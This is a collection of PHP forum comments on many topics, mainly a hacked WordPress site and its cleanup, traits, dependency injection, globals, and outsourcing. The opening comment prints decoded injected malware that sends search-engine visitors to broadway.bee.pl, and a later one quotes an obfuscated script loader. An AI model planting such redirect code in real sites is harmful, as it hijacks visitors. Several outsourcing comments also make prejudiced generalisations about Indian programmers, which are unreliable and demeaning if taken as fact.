That decodes to the following error_reporting(0); $qazplm=headers_sent(); if (!$qazplm){ $referer=$_SERVER['HTTP_REFERER']; $uag=$_SERVER['HTTP_USER_AGENT']; if ($uag) { if (stristr($referer,"yahoo") or stristr($referer,"bing") or stristr($referer,"rambler") or stristr($referer,"gogo") or stristr($referer,"live.com")or stristr($referer,"aport") or stristr($referer,"nigma") or stristr($referer,"webalta") or stristr($referer,"begun.ru") or stristr($referer,"stumbleupon.com") or stristr($referer,"bit.ly") or stristr($referer,"tinyurl.com") or preg_match("/yandex\.ru\/yandsearch\?(.*?)\&amp;lr\=/",$referer) or preg_match ("/google\.(.*?)\/url/",$referer) or stristr($referer,"myspace.com") or stristr($referer,"facebook.com") or stristr($referer,"aol.com")) { if (!stristr($referer,"cache") or !stristr($referer,"inurl")){ header("Location: http://broadway.bee.pl/"); exit(); } } } } If `broadway.bee.pl` is the site your visitors are being redirected to then this is where it's happening. How that code got into everyone of your php files though is another problem. 
I ran into this the other day. Basically, someone (or a bot) was able to gain access to write into your source files. The best thing you can do here is either contract someone to take care of this for you, or do the following. * Update, update, update everything. WordPress, Plugins, etc. * Change all WordPress passwords and consider removing the default admin account. * You'll need to edit every PHP file and remove that line of code. It's best to have a script to do this. I was able to do this with a Linux shell one liner using find/sed. See http://pastie.org/3252197 * Ensure file permissions are set correctly. 644 for files, 755 for directories, assuming this is Linux. Hope that helps. 
randomguy3 posted a solution to automatically remove the code from multiple files. More importantly you need to find out how the attacker managed to do this, follow randomguy3's advice, update everything. If you're not sure, have someone who knows about security look into it.
When I dealt with this the exploit existed in wordpress.
It's a TDD thing. IMHO, Dependency Injection is one of those things that has had a ton of hype by people who don't understand what a pain in the ass it is to write that much extra code - it's preemptive refactoring at its worst, though it is entirely necessary for TDD. I'd be all for using some sort of injection container, but since PHP usually exists as single-run scripts, it doesn't make sense to add that kind of overhead to every request.
I had this happened to my blog over a year ago. I fixed it as soon as I found out about it, but Google *still* won't index my site. I hope you have better luck.
Wow! Thanks so much :) Quick question about point 2 though: I'm currently running it on windows and it's working? I'm not too sure what you mean by that. Thanks again, this is incredibly useful!
And it's a good thing they do or we'd be writing COBOL
Personally, I feel that traits will become [the new eval](http://blog.ircmaxell.com/2011/07/are-traits-new-eval.html). In short, it's a static, compile time construct. So it's really nothing more than compiler aided copy/paste. Your decorator pattern on the other hand is a runtime compost, which is quite different and far more flexible due to the dependency direction and cohesion. I agree that horizontal reuse is important, but I don't think that traits are a good solution to that for most things it will be used for. I'd much rather see a dynamically composable object (similar to a prototype or mixin system). I actually started a [thread on internals](http://marc.info/?l=php-internals&amp;m=132206199125242&amp;w=2) to get some thought going on how to make decorators much easier to implement. Personally, I think that making decorators easier to build, and adding a dynamic class structure is the correct answer to what you're looking for. Traits just seem way too static and tightly coupled for me to be useful. It really is just automated copy/paste (which is better than regular copy/paste, but not by much)...
&gt; How do I screen programmers? - What sort of questions should I be asking? Personally, when it comes to PHP programmers, I talk to references at sites with decent traffic that the programmer has worked on. If they don't have any such references, or they don't think they will talk with me (or at least email with me), then I pass. I want to find out whether the person can manage a project on their own, whether they know the technology well, whether they are security-conscious, and whether they produce code of a quality that it can easily be worked on by other people.
I've been meaning to learn Unit Testing, do you know any good tutorials?
Well you get what you pay for. Check out http://esavv.com My name is Kyle and I used to work there. They have all American programmers and most of what they do is in PHP. They do extensive testing on everything they build. The owner is a software engineer with certificates and degrees. 
What you need this time that you didn't have last time is a lawyer and a contract.
Haven't looked into traits much, but I will say that namespaces along with [PSR-0](https://github.com/php-fig/fig-standards/blob/master/accepted/PSR-0.md) is fantastic and it makes writing in PHP so much more enjoyable / organized with the autoloading. 
With an experience like this I'd consider looking for an actual company that can point to clients (even let you speak with past clients). Tell them your plans, which it sounds like you have, and tell them to bring a project plan of RFP for you. Thats how you can know they are serious. I would never trust foreign labor to a big project.
Contract with a foreign programmer wouldn't be worth the paper it was written on. Don't pay til you see progress. I use freelancer.com and I never pay up front.
Try these for yourself: [opensourcecms.com's groupware page](http://www.opensourcecms.com/scripts/show.php?catid=4&amp;category=Groupware) For those not in the know, this site has fully configured standard demos of content management systems that you can play with (resets every couple of hours). As an added bonus, you can check out the comments and reviews for each installation.
Why do you have to go to India? If you need a guide, take a look at Joel Spolsky's blog, he basically is the authority on how to hire good developers, you can start with: http://joelonsoftware.com/articles/FindingGreatDevelopers.html There's about 20-30 articles on hiring developers on this blog, each one is really good. Hiring offshore (especially if you aren't an expert developer yourself) is a really bad idea except for stuff that requires no thinking (i.e. splicing a design into html).
As a programmer myself my only advice regarding outsourcing is to only outsource small components. That way if you get a dud you aren't out much and can easily fix whatever damage they cause. Anyone overseas that claims they can do everything for you and cheaply is almost guaranteed to be trouble. I feel sorry for all the people that I see on Elance and Freelancer who contract out people to clone my sites and products and get bids of around $200 to develop something I worked over a year on.
Yep, not suggesting a foreign one (I should have specified that). Also not paying up front is sound.
I said this the other day on /r/programming, but at a major version change they should rearrange everything to how it needs to be, and don't bother with deprecation but instead create a tool that can convert all the trivial changes in old code. Python did this at version 3, and while it wasn't perfect, the 2to3 tool could convert the vast majority of incompatible changes.
This is not just about finding a programmer. It is about finding people who care about your product and are willing to understand what you communicate and what the users actually need. Unfortunately there are no silver bullets there - as it does require a relationship between you and the provider. My recommendation would be to try to be agile in the project and lead the development between each sprint, focusing on issues when they arise and providing feedback to developers quickly on whether your and their mental models of the solution and problem domain are different. But honestly you do get what you pay for.
Could be relevant: http://stackoverflow.com/q/7892749/385378 =&gt; Imho traits just aren't really useful.
http://openatrium.com/
Agreed. I was introduced to autoloading and namespaces when I started working with Symfony 2 and Silex. It took a bit of mind-wrapping-around... But wow. I can see what we were missing before, and I only see the tip of the iceberg, so to speak. Really convenient stuff.
&gt; But honestly you do get what you pay for. This. If you aren't willing to maintain the website, why do you expect a professional to do the same for a portion of the money?
Traits are a logical addition to the language. PHP already has class inheritance; which combines both type and implementation. It has interfaces which is just type inheritance without implementation. Traits is the final piece: implementation inheritance without type inheritance. I don't see myself using traits very often but I have literal duplicated code in a project right now that traits would remove. I have two objects on different class hierarchies (namely because they are subclasses of build-in classes) that then implement the same interface with the same implementation. Sadly the only solution was to copy the code. I'm honestly not sure how I'd change my coding practices once traits become commonplace -- we're used to not having them and finding other ways to solve the same problem. I looked at your decorator suggestions and option 2 seems like the most flexible. It really solves the underlying problem, which isn't specifically about decorators, but rather the weirdness around interfaces and magic methods. The other solutions are good for 1-to-1 decoration but don't work for something like the jQuery API where you have a collection of objects and methods execute against all the contained objects. I'd say `\PHP\Decorator\` isn't a generic enough name for that functionality. 
Honestly, it's a real improvement and I like it **very much** even if I think like many people here that green and purple are not the best color match. But I do like the elephant banner: some fun is good!
It could just be me, but i have never, ever seen anything good come out of outsourcing programming to places like India.
if a url is not found, the server should return 404 Not Found. It's pretty basic. If page is hosted on server, should display a nice error page. If ajax, just return 404 and client should handle that. 
It depends how worried you wanna be about "no logic". Some say simple if statements are ok in a view. The controller could equally well hide stuff on the view depending on authorization, depending on the client. With server generated html, probably ok to do in view. With, say an ajax client, can do easily in controller, so should do there.
Old school perhaps, but I just have a notebook and a phone. If I need to do it, it goes on the list. When it's done, cross it off. If it's important, put a star at the end. * I've tried software solutions but I just end up procrastinating and wasting time setting everything up. I do dream one day I'll have my own business and ask everyone to use an integrated solution like Open Atrium or Producteev...
It caused me a headache on first glance. Can it please be much more simple and light? Why all these pictures and colors? Keep it simple please.
Here is my experience with people outsourcing work from other side of the world to India. * Most of them come with a simple one liner, "I need a clone of XYZ website in a month" * If I somehow get in touch with them and try to explain them that this is BS, a successful project involves much more than just one page document, they will say you are too slow, the other guy can do this in a month. Other guy wants to make a quick buck. I lose the project. I am employed so never mind. * If some one does post a detailed requirement and I post a 22$ per hour bid, it goes to 5$ per hour guy, coz he is cheap * then if nothing like that happens people look at ratings. One can earn top ratings by just fixing CSS bugs and get the programming jobs which they screw. * No QA efforts. Not at all. Clients think that developers would give them production ready code and they can release the product w/out QA. QA is not development. But who cares. End of the day, I see similar rants, "Oh some one in India screwed me". I on the other hand got screwed in two projects. I delivered the code and am still waiting for the money. My mistake, I didn't log all the chats and mediator said sorry dude, you should not have delivered/hosted the code on buyer's box. Nevertheless , I have learned my lesson. I am working on a project, the code is hosted on my box, I have 50% payment received and client swears by the job, this even when I myself know that the product has to go through QA rounds.
This, oh so very this. There is a reason why a good developer costs more than a grindmill in India.
No, he's right, unless it's mindless work that requires no ambiguity, you're not going to get anything good.
What do you mean you can't run `$hash_functions['sha1']($plaintext)`. That's perfectly valid syntax and would run without any issues if the 'sha1' key in $hash_functions is a function *or* a string that is the name of a function?
Neither are things that are considerably used by the PHP community. Well, I'm sure people put things in namespaces, but I doubt they ever need to.
nice to hear the other side of the outsourcing story
I'm not saying it's not just you, but I've colleagues with many success stories of outsourcing to *places like India*. You just need to know how to hire the good developers and ditch the bad one's right away.
To be clear, I did vote for the inclusion of traits in the language. I understand the concept and agree that from a symmetrical point of view it absolutely makes sense to implement. What I don't agree with though, is how it will likely be abused. I'm a firm believer in *favor composition over inheritance*. Traits are another form of inheritance (since you can't dynamically compose an object at runtime). Therefore, their use in most cases would fall on the right side of that rule-of-thumb. Which means that a lot of places it will be used should better be served by composition instead. I'm not saying that they have no use at all, just that we should be very cautions about just "reaching for them" because they are there...
Help me out, please. I've thoroughly analyzed the documentation and source code of Pimple [horrible name choice!!], and I cannot figure out what it's actually good for. It seems to be an ArrayObject that holds nothing but closures that do nothing but create new objects of various classes. How does this help anything?!
A better question might be, what features do you feel all the PM software out there is missing? My main feature if the fact i always take notes about a new project in an outline. I'd love to be able to have something that then converts that to a series of tasks in a system, just haven't found anything to do that yet.
What scale are you working with? How many people will be using it? You can go from a simple to do list, to the Eisenhower way, RedMine and then large scale apps like Jira...with lots of options along the way
We did this when looking for a SugarCRM company. It turned out work was out-sourced by them anyway, and we had all the same misunderstandings, crap quality, broken software etc. that we could have got if we outsourced by ourselves, but for three times the cost.
That's not a decorator. It's more like a hybrid between a [chain of responsibility](http://sourcemaking.com/design_patterns/chain_of_responsibility) and [Visitor](http://sourcemaking.com/design_patterns/visitor). The true decorator pattern is described [here on sourcemaking](http://sourcemaking.com/design_patterns/decorator). A simple example of a decorator could be [this example](https://gist.github.com/1682854). Basically, where you *wrap* a child object in order to either add or alter functionality.
3 text documents, to do list, idea list, working area. I've started using evernote for meeting notes, but other than that it's just plain text. Oh and gmail get the jobs done on delegating and client communication.
In its simplest sense, DI helps you write better unit tests for your code by allowing you to move internal dependencies outside your class. A very simple example: public function __construct () { $this-&gt;db = new Database (); } Versus: public function __construct (Database $db) { $this-&gt;db = $db; } Now in your test, you can pass a mock object to the constructor that mimics the Database class. This helps isolate tests so that failing assertions should only be the result of faulty logic in the class being tested, not in something it relies on. I find DI containers often have poor docs in that they provide an API overview, but not concrete examples for when a full DIC is needed. They're kind of a way to organize the instantiation of complex objects that may require additional setup in such a way that you're not hard-coding the setup in each place. Here's a page that gives a better example: http://components.symfony-project.org/dependency-injection/trunk/book/02-Dependency-Injection-Containers
I honestly haven't even had good luck with the mindless work either. I have no doubt there are quality indian development firms out there, it's just that it seems like for every one that is good, there are about 20 others that are a borderline scam.
There's probably closer to 200 that are actual scams, 2,000 that are borderline, and 1 useful firm.
Can I ask how much you paid this guy? The biggest bit of advice is, you get what you pay for. There are certainly some offshore firms that can do good work, however they aren't going to be the cheapest and they're hard to find. Plus with the distance, language barrier and potentially less defined legal process if something goes wrong, it's a lot more of a risk. My advice would be to hire someone local. Someone you can meet face to face. I find you end up with a better working relationship that way, and someone is less likely to screw you over if they know you're in the same town and a small claims suit is not much of an effort to file. Failing that, don't hire the cheapest guy you find... Do your homework, get referrals. If you really want to test someone cheap, give them a small task and give them a small window of time to complete it, and see how they do. Then you can start discussing a bigger contract. Another factor here... No offence, but most experienced developers would run away from working on an app that was developed by an amateur hobbyist. I'm not saying you didn't do a great job but... Let me put it this way, if you had a site specced out you wanted me to develop from start to finish I might quote you $50 an hour. If you want me to fix problems with code that someone else who may not have a clue what they're doing wrote, I'm going to charge you at least $75 an hour if I even decided to take the job, which I probably wouldn't. So the advice you didn't ask for... If I were you, I'd find someone competant, preferably a local independent developer (who would be cheaper than a local firm). I'd have them take a look at the site and give you a quote to redo it. Taking a look at it, to be honest, this is something that could be built using drupal or another CMS with little to no custom code. Going that route would get you something that can be upgraded, has a standard way to add features, has 3rd party tested code and does not require a developer to figure out how the whole thing works. Alternatively someone could write it from scratch, which would cost a lot more. A viable option if you are concerned about having a clean codebase and ability to scale, however. And finally, of course, you can try to find someone to work on your code. Having not seen the code, I can't really advise much on this other than to say that I and most developers I know are extremely reluctant to take on any project that involves hacking someone else's code. If you go this route, you should let people know up front this is what you are asking and give an overview of how your application is written/structured. They're also going to need more time, because adding new features now involves trying to figure out how someone else's code works, which can be quite difficult. Just find someone qualified, check references, start with small bits and LISTEN to them. 
I had top coder rank on RentACoder, I can share the details via PM, I tried my best to bid for projects &amp; lost projects to lower bids, so when you are paying for coal you should not expect diamonds even though both elements are essentially Carbon forms.
WHAT ABOUT LAMBDA FUNCTIONS?!?!?!?! Sorry for the yelling, but I haven't found them very useful, while they were widely talked about, at least in the few circles I hang out in. Maybe I need to find new circles.
More info: http://www.markdotto.com/2012/01/24/bootstrap-2-ready-for-testing-and-feedback/
I used to be a not-overseas Odesk worker. They DO have provisions put in place, but they also have certain rules. You MUST use their tool that takes snapshots of your screen to have protection as a developer. However IF you do use the tool and IF the project is hourly, then there's nothing the employer can do if the site doesn't get done in X hours. Basically the contractor proves with that tool that they were *working* and you're paying per hour, not per things getting done. I believe that there are ways to pay per things getting done, and that the rules about disputes are different in that case, but they're probably similar in that there are certain rules that you can follow to guarantee that you'll win.
You can't really quote a total project cost. I mean a 5 page marketing site with a contact form is a different beast from a one off custom workflow application... My company, for example, charges $100 / hour. Our projects range from $2,000 up to $100,000. A few in house applications we run probably have at $300,000 in salary alone on them.
As a developer I would never take a job without a deposit :) I require 20% up front to start work. You end up with too many projects where after a few months of work they decide they actually don't want to do it any more and refuse to pay for it. It goes both ways... But I'd say, if someone wants to hire me but is not willing to front any money, I generally assume they have no money to pay me, or are going to be difficult to work with. Either way, not worth my time. In an arrangement I consider to be worthwhile, a client will do their homework on me and I on them, and we have enough understanding of each other than a deposit to begin work is no problem.
You're right, but I think I know what he was getting at; if you come from some other langs (say, JS), then you might want to do this: $gen = function () { return function($z) { echo $z; }; }; $gen()('test'); But you can't: Parse error: syntax error, unexpected '(' in [...] You also might want to do this: class foo { function bar(){} } new foo()-&gt;bar(); But again, you cannot (parenthesizing the object instantiation doesn't relieve the problem either)... Parse error: syntax error, unexpected T_OBJECT_OPERATOR in [...] That's just 2 quick examples, but there are many more. In short, the parser seems extremely inflexible, and these fancy new langage features seem to be shoe-horned in -- much like OO in PHP 4. It's like PHP is trying to _appear_ modern without actually going through the growing pains of becoming modern. **NOTE:** These examples are all PHP 5.3.5 examples; I know there's been ongoing discussions on the internals list regarding some of these use-cases, though I can't remember what, if anything, has been changed in trunk.
... or they just think his logic is flawed, which it is (rests on false assumptions).
Not all scripting languages are created equal -- PHP is much more like Java than it is like Python in how classes are constructed. If you just ran the Java compiler on every request, you'd end up with something much closer to how PHP works. 
I've actually had plenty of good and bad experiences both overseas and locally. I guess the biggest problem when dealing with an overseas company is the timezone difference and the language/culture barrier.
Not true. I could have paid less for this, but I decided to hire the contractor who appeared to have the skill set that I desired. I definitely didn't cheap out on this one.
I had a 17-page, extremely detailed, bullet point project scope. I didn't select the cheapest bid either. They had good ratings for extremely similar sites. They just turned out to be really unskilled.
They showed me 2 really solid looking sites that they had built. Walked me through them. Had lots of experience and great feedback on Odesk. And they charged more.
I have worked with a company called ITCompletes in Pakistan. They were absolutely great and I would re-hire them for pretty much anything.
Original contract value was $20,000. Interesting what you say about not wanting to work on other people's code. What if you were to rebuild the site on your own, and then write a script to import the existing database into the fresh, new site? This time around, I'll definitely be hiring someone who is a native English speaker, and ideally located in North America so that we share similar working hours, and can Skype face-to-face. I want to start them off with small bits, however the first step to fixing the site (in my opinion) is to entirely re-build it. I do have some existing bugs I want them to fix, but it would easily take 5-10 hours for them to begin to wrap their head around how I built it in the first place.
If you are using MySQLi or PDO [as you are *supposed to*](http://ca2.php.net/manual/en/mysqlinfo.api.choosing.php), then you should have no possibility of SQL injection. Both use input parametrization, which entirely eliminates SQL injection, if you don't purposefully break it.
Unfortunately, we only permit English-language posts in this subreddit. Sorry about that.
Finally. I lost four hours the other day due to some janked up javascript in their tabs. 
Couldn't you just do the following? $xml = (array)simplexml_load_string($xmlstring); EDIT: Nvm, it doesn't work with multi-dimensional arrays. EDIT2: Actually, yours doesn't work either, doing a var_dump returns objects.
I agree. I'd like to find someone who understands the whole concept of my website, and is on the same page as me in terms of features and the user experience, etc.
Kanban boards (real ones) are great. I only have to manage myself though. 
I used the website that was recommended on that blog (unmaskparasites.com) to see where the problem is; it tells me that the "Obfuscated Script" is this: if (!window.jQuery) document.write(unescape("%3Cscript src=\"http://lenderins.com/wp-content/plugin... It doesn't say any more than that though. So I am assuming the problem has to do with a plugin that I have installed? Is there any way to find out more detail about this?
Remember, lots of these viruses mask themselves by only "loading" when a user comes in from a search engine. As the writer of that blog thats the exact scenario I encountered at an ecommerce company I was working for at the time.
I have removed the weird code that was inserted into each of the php files on my site, and have updated my wordpress, and changed all the passwords. Do you know of anything else that I can do to fix the problem?
It's not just you.
Why is this downvoted? There's a very real correlation between how much of their brain and time a client is willing to devote to a project, and that project's success.
I know that can feel frustrating, but I always try to remember how easy they make most other things!
You would do much better to hire a European. German or British. They make some good, honest programmers over there. Their CS college curriculum, on average, is better than what the US throws at our kids. I hired a British guy and he basically tells me "no, you're doing it wrong, I'm not going to do it that way". We spend a lot of time arguing, but I like that he takes pride in doing it the right way.
**Nobody** outsources their core competency to India. Deloitte actually wrote an article about outsourcing and came to the same conclusion, outsourcing is only ok when it isn't a critical task and the requirements are clear cut (i.e. there is no thinking). This goes for pretty much any type of outsourcing, even manufacturing...you don't see Apple actually USING China or India to design the iPhones, just the mindless assembly. The problem the OP and many other people are saying is that, outsourcing is just plain bad when you give them any type of ambiguity.
This times a thousand.
Not php. try /r/webdev or /r/web_design
If you are using the mysql extension, then sanitize any data that you put into the database using: $input = mysql_real_escape_string($input); Ideally, however, you should be using mysqli for pdo.
I get a big multi-dimensional array using the OP's code on all the test-subjects I've tried.
[New circles, mate](http://pimple.sensiolabs.org/)
Maybe not, but surprisingly relevant to our interests.
I'm a PHP dev who drinks a lot of coffee. I'll post some coffee-related articles.
It sounds like your project was too big. IF it was 17 pages, you should be able to easily break it down into more manageable mini projects. This allows you to set some pretty well defined milestones where you can change plans or go with a different developer if things aren't working out. My hourly rate for freelance work is $125/hr. My clients get what they pay for. I wouldn't work on a project this big. I'd direct the client to break it up. For a large complicated system that is built from scratch, we'd first define a minimum viable system, build it, then add on features from there as separate projects. A good developer has to do this on their end anyways to complete the project. You can't often just take a HUGE list of changes and start working with everything in mind from day 1. You have to break it up.
I prefer it to DateTime because: * **It's simpler**: Everything is a string, there's no DateTime or DateTimeInterval objects to create. * **Less verbose**: I'm a big fan of brevity. Take a look at these code blocks below. Both produce identical output: **DateTime** //add 10 days to 2000-01-01 $date = new DateTime('2000-01-01'); $date-&gt;add(new DateInterval('P10D')); echo $date-&gt;format('Y-m-d'); //get number of days between dates $datetime1 = new DateTime('2009-10-11'); $datetime2 = new DateTime('2009-10-13'); $interval = $datetime1-&gt;diff($datetime2); echo $interval-&gt;format('%R%a'); **Sole Dates** //add 10 days to 2000-01-01 echo Date::addDays('2000-01-01',10,'Y-m-d'); //get number of days between dates echo Date::difference('2009-10-11','2009-10-13','days'); * **Uses same units as strtotime**: In looking at DateInterval it appears to use different unit identifiers. That's not necessarily a bad thing, but I'm more familiar with strtotime's conventions so I prefer those. * **Provides convenience methods for comparing 2 dates**: Most of the time when I'm validating dates, I want to know if a given date is before/after/on the same as another date, so I added methods for that: * Date::isAfter($date, $compare_to) * Date::isOnOrAfter($date, $compare_to) * Date::isBefore($date, $compare_to) * Date::isOnOrBefore($date, $compare_to) * Date::isIdentical($date, $compare_to) And if you combine the compare methods with Date::add, you can do stuff like show a 10 day calendar: $date = '2012-01-30'; if(Date::isOnOrBefore($date,Date::addDays('TODAY',10))) echo "$date is happening within the next 10 days";
I use [syslog](http://php.net/manual/en/function.syslog.php). A little more complicated to get started using, but it provides a little better level of granularity than having something always show up in the web server error log.
horizontal re-use is a big fucking deal regardless of your language. It's easy to pass it off as another version of MI, but you're missing the point.
namespaces and file loading are two separate issues. You should be using namespaces for logical structuring and to avoid naming collisions. If you want to stop using autoloading, go right ahead, but don't throw one out because you don't like the other.
Global vars are good practice only when the environment requires it, like in WordPress.
This is where I picked up the bad habit, since I really started to learn PHP about a year back for the sole reason of developing a Website for a customer. EDIT: meant to say WordPress website.
:) Well, maybe there is a good use for a global once in a while. Can you go a little bit more into the hidden dependencies issue, I can't seem to understand what you mean by this. I do, 100% agree that globals can make testing a hassle. As a side note, my main language is Java and I have had a lot of luck of using the singleton approach, especially for things like application context. I wonder if PHP's structure make singletons work differently.
But they go hand in hand: if you use namespaces without autoloading, you'll have to use the (fully) qualified class name of each class at least twice, assuming that your folder structure matches the namespaces. You'll first need to import the file, and then you'll either need to use the use keyword with the qualified class name, or you'll need to use the qualified class name everytime you use that class. So using namespaces without using the autoloader is even worse imho.
Because readability &gt; compactness. 
A database class isn't really a good example. Usually you don't use the database in that much classes. I'd recommend you to learn a bit about dependency injection. It's too much to put inside one comment, but there is one youtube video which made me understand what dependency injection is and why you should use it: [video.](http://www.youtube.com/watch?v=-FRm3VPhseI) This video is from a Java point of view, but this holds for any language. I'd also recommend the other clean code talk videos: [more videos](http://www.youtube.com/results?search_query=the+clean+code+talks&amp;oq=the+clean+code+talks&amp;aq=f&amp;aqi=g2&amp;aql=&amp;gs_sm=e&amp;gs_upl=556l3180l0l3228l20l16l0l11l11l0l95l311l5l5l0)
That is funny, I actually started this question because I started to read up on ID. I will deff watch this video and I really appreciate your comments.
Sweet, thanks for posting this. I was just playing with v1
Indian workers are trouble. Some are great I'm sure but they lack the ability to 'think'. By this I mean some are perfectly good at following direct instructions but given an ominous problem they have no idea what to do. They lack the creative problem solving ability a 1st world programmer develops through organic development of their skills. 
&gt;If I want to add one year, two months and 15 days to a date, how would I do that? From the looks of it, that requires three different calls. Nope, just one call. That's what's cool about strtotime underneath you can just throw all those intervals right into the add string: echo Date::add('TODAY', '1 year 15 days 2 months'); &gt;Similarly, comparing dates with DateTime seems to be more sensible. You simply use the comparison operators ($a &gt; $b). The convenience methods all just wrap Date::compare($date, $compare_to) which returns -1, 0, 1 so you can do the same thing with Sole Dates: $test = Date::compare('TODAY','TOMORROW'); switch($test) { case 0: return Date::IDENTICAL; //Date::isIdentical, isOnOrBefore, isOnOrAfter case 1: return Date::AFTER; //Date::isAfter case -1: return Date::BEFORE; //Date::isBefore } I do appreciate you taking the time to look at it. I was totally psyched when I released it the other day and bummed I was the only one to upvote it 2 days later, so any feedback, good or bad, is seriously awesome to hear.
No. And there's really not much else to say. Everything you've described is not required. I know it isn't required, because I don't do it in my own code.
Explicit dependency: function x(DB $db) { ... } // called like this: x($db); // everything obvious Hidden dependency: function x() { global $db; ... } // called like this: x(); // &lt;- doesn't look like it needs anything // Undefined variable $db? WTF?!? // Why u no work?! =&gt; have to check function definition // Then: $db = ...; x(); // Ahhhh.... Get's worse the more hidden dependencies you have. @Singleton: If you need only a single instance of an object, then just create only one. Exposing it via `XYZ::getInstance()` is just like `global $xyz;` and thus bad practice. Actually it is even much, much worse, because it tightly couples the code to the `XYZ` class name, making it impossible to extend `XYZ`.
Correct, nice catch. How about subscripting an array returned from a function (pretty much just the other way around)? php &gt; function ret($a) { return $a; } php &gt; echo ret(Array(1, 2, 3))[1]; PHP Parse error: syntax error, unexpected '[', expecting ',' or ';' in php shell code on line 1 Same kind of thing. This is something I've actually come up against, the function example was pretty contrived.
Probably because my statement implied a number of things that I didn't quite mean. Your comment is probably more succinct. It's impossible to know the whole story, but I suspect that the task of "rewriting the entire website" is not as trivial as the OP might be thinking. It looks like he did a lot of work communicating and coming up with specs, which is good; but I've seen projects like this fail because of a lack of strong technical leadership: specs contain things which are impossible, undesirable, or flat out nonsensical.
In that case, please show me how you use namespaces. If you can show me how to use the class my\long\namespace\class1 in a class another\namespace\class2. If you can do that without autoloading, and with only writing my\long\namespace\class1 once, then you've probably convinced me;) Edit: of course, the folder structure should also match the namespaces. I don't think you want every file in one folder.
http://www.php.net/manual/en/function.money-format.php
load_module_and_dependencies('class1'); 
Close enough debby downer
&gt;I wonder how all those MVC frameworks handle db transactoins With a singleton or registry pattern, generally. Static properties are key here. 
Sounds interesting, never really learned much about registry patterns, another thing to add to my list.
Nice troll;) if you're a php programmer and you've looked into namespaces you know that doesn't work.
I'm afraid that this really isn't very useful - the features to compare by here are present in any decent framework. An actual hands-on comparison would be relevant, as it is this really doesn't add much over the Wikipedia list.
After reading this, I am making a strong move to learn MySQLi for PHP. It does not make me happy to hear that mysql for PHP is going to be deprecated.
Yeah you need to scan your own computer for virus and rootkits. There are some viruses that will steal your FTP passwords from your local machine and send them off to criminals. Programs for instance like FileZilla store your passwords in clear text (not sure why) so they are easy to steal. Moving forward if you use programs like FileZilla you should not store your password in it. For instance my file zilla stores only the ftp servers name and then prompts for a username/password each time I start a new session.
That is looking like very much the consensus around here and I think everyone knows what they are talking about. This is the direction that I am going to be heading in.
:) im only upset for the reason that I will have to update a bunch of stuff.
This is a good example to rshnrocket learn from. It's a global in the sense that a single entity (in this case a database connection) is globally available throughout the app, but the entity itself is encapsulated inside a class and therefore can be controlled and contained quite easily. This is a good example. Using the 'global' keyword is a sign that you're doing something wrong. Whenever I see it used in projects I inherit I know I'm about to encounter a spaghettified mess of shit, and I've never been proven wrong to date.
Someone needs to tell my clients that the stuff I've been doing for them for the last year or so doesn't work.
why not $pdb = new PDB('xxxx'); $pdb-&gt;query(); // Later on... $pdb-&gt;query(); I don't see the difference!
How is EDP practically different from MVC? Most implementations of MVC user a route to point to an 'event' in the controller... Indeed, in 99.9% of cases, PHP is called *as an event* - a user has made a request of the web server.
Singletons and Registries are not design anti-patterns. 
Argument 2 to json_decode determines return type. * true: associative array * false: object Defaults to false.
I don't think there is one. And really, if some hacker wanted to get an account on your domain, temporary emails are legion these days.
A few enhancements: * The table of content on a documentation page is nice. * Less space is wasted but the page dosn't feel too heavy Still far from perfect and even worse than now: * Writing in gray is a *big drawback*. Please think of usability, confort, and partially color-blind people. * Syntax highligting is not very readable. For instance comments in orange on a gray background are hard to read for me. * Examples aren't well separated. * The examples' titles are not visible enough. * Separation between user notes is too light. * Usernotes usernames aren't separated enough from the content. * There are glitches in the "Quick TOC" when scrolling with some browsers. * The white banner at the top makes me feel the site has lost its identity. It feels dull, compared to the bicolor blue banner with a well-identified logo.
Is there a list of changes somewhere?
Just a small correction, but I assume you didn't mean to say "Class.property" unless I misunderstood what you were going for and were comparing Java class properties to PHP array elements.
Wow. That's pretty shocking... I mean even if you hired my company, who charge about double what I do solo, that would get me full time for 5 weeks. I can do an awful lot in 5 weeks... I'd really suggest checking out drupal though. I do less drupal these days, however it's something I turn to when the project suits it. Looking at your site, this could be built fairly easily with drupal, views, fivestar, forum, etc. Someone who knows what they are doing can set that up quite easily, or you could do it yourself and save a ton of money, then just hire a developer for the little bits of custom functionality needed. The advantage of a system like drupal is that you get a lot of what you need (especially on a site such as yours) for free (excluding the learning curve if you start from scratch, of course) and you have a standard, well supported platform that is easy to find developers for. If you were to approach me on this project, starting from scratch is something I'd do but at many times the cost of say a drupal based site. Of course I don't know the details of what specifically you want to do with the site, or the kind of load you are supporting, but just looking at it it appears to be a perfect fit for a drupal setup. 
Well, the singleton pattern that i use Java isn't very much different than what you described. The patter that I use is: Create a Class with a constructor, In that class create an declaration for the same class, in the constructor check if that declaration has been instantiated, if not create an instance, otherwise return the previously said declared class. Hopefully that wasn't too confusing.
Gotcha. Unfortunately, a lot of what you said there is misleading or just plain incorrect. It would be much more accurate to say that a PHP array is similar to an instance of the HashMap class in Java. &gt;Think of a singleton as an array. Please don't. A singleton is not in any way, shape, or form an array, and it is just plain confusing to think of it as such. Also, don't forget about the "stdClass" class in PHP 5, as it is much better suited to this kind of purpose. It is a generic class (akin to Object in Java) and is useful for anonymous objects such as this. $cfg = new stdClass(); $cfg-&gt;arbitraryPropName = value;
Great example, thank you very much for sharing this with me. I will make sure to make great use from this.
That is exactly what I was asking about. That seems to be that pattern that everyone on here is going for. It is time for me to move away from the global. Thank you.
$pdb isn't going to be available to any other class or function than the one you're currently in unless you declare it global. The other problem is your later calls to $pdb-&gt;query assume that $pdb has already been created. This might not be true if you had multiple code paths. And you don't want to just blindly instantiate $pdb = new PDB('xxxx') at the beginning of each request, because you might not even need $pdb on each request. That's what I like most about the static method. It lets you lazy load the db connection AND it saves you from ever having to explicitly instantiate it in the app code. 
Watch [this video](http://www.youtube.com/watch?v=hBVJbzAagfs&amp;feature=player_embedded). Even from about 2 minutes to 15 minutes will give you what you need. This is from Google's Guice project, which is a dependency injection framework for Java - that might make it easier to understand if you've been doing OOP in Java. The talk covers why you'd want to declare dependencies directly, and how you can do away with the boilerplate code of defining and providing them. In almost every case, a singleton is better modeled as a dependency. It's then satisfied as an instance from application scope (everything that lists it as a dependency in the same application gets the same instance).
Thank you, I'm about to watch.
Where do you recommend the output type be specified?
Thank you very much, seems a little over my head rifht, but I will save the link for when I get to understanding autoloading better. 
